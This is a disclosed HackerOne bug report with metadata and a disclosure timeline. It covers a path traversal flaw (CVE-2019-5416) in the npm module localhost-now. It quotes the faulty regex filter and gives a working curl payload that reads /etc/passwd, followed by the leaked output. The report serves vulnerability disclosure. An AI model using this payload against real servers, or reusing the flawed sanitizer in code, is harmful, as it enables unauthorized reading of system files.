---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-05-30
submitted: 2018-04-09T09:23:56.500Z
bounty_usd: null
votes: 4
cve: "CVE-2019-5416"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "dienpv"
source: "https://hackerone.com/reports/334837"
title: "[localhost-now] bypassing url filter which leads to read content of arbitrary file"
---
# [localhost-now] bypassing url filter which leads to read content of arbitrary file

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2018-05-30

- Report: [https://hackerone.com/reports/334837](https://hackerone.com/reports/334837)
- CWE: Path Traversal | CVE: CVE-2019-5416
- Submitted: 2018-04-09T09:23:56.500Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi guys,
i can bypass url filter in localhost-now module.
It allows to read content of arbitrary files on the remote server.

# Module

**module name:** localhost-now
**version:** 1.0.2
**npm page:** https://www.npmjs.com/package/localhost-now

## Module Stats

26 downloads in the last week

## Vulnerability Description

Lack of file path sanitization by using the regex method causes that any file on the server might be read by malicious user
ex: input: url = ..././etc/passwd
when the url calls replace(/(\.\.[\/\\])+/g, '') and then ../ will be removed -> final result: url = ../etc/passwd. (same in windows for ```...\.\```)
```javascript
// /localhost-now/lib/app.js, line 17:
const file = url === '/' ? '/index.html' : url.replace(/(\.\.[\/\\])+/g, '')
```
## Steps To Reproduce:
- install ```localhost-now```:
```npm install localhost-now```
- run ```localhost-now``` in your directory

```
root@kali:/var/www/html/localhost-now/bin# nodejs localhost
Web Server started on localhost:1337
```
- execute following curl command (adjust number of ../ to reflect your system):

``` curl -v --path-as-is http://127.0.0.1:1337/..././..././..././..././..././etc/passwd ```
- look at result:

```
* Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0)
> GET /..././..././..././..././..././etc/passwd HTTP/1.1
> Host: 127.0.0.1:1337
> User-Agent: curl/7.50.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: text/
< Date: Mon, 09 Apr 2018 09:04:13 GMT
< Connection: keep-alive
< Content-Length: 2908
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
```
thanks you

## Impact

This vulnerability might be used to read content of any file on the server

## Timeline

- **Report Filed**
- **2018-04-09** @dienpv: please ask me if you need more information
- **Report Severity Updated**
- **Report Triaged**
- **2018-04-11** @dienpv: any update ?
- **2018-04-11** @marcinhoppe: @dienpv I am trying to get in touch with the maintainer of this package to coordinate the fix. As I previously mentioned, I managed to reproduce and triage the report so we will be working towards a responsible disclosure.
- **2018-05-08** @dienpv: i tried to contact the maintainer via github and twitter but it seems that he hasn't joined for the fix
- **2018-05-24** @dienpv: @marcinhoppe
can we disclose this issue ?
- **2018-05-28** @marcinhoppe: @dienpv I made a last attempt to contact the maintainer. If he does not respond within 2-3 days, I will disclose.
- **2018-05-30** @dienpv: Let's disclose !
- **2018-05-30** @marcinhoppe: @dienpv That's what I'm going to do!
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
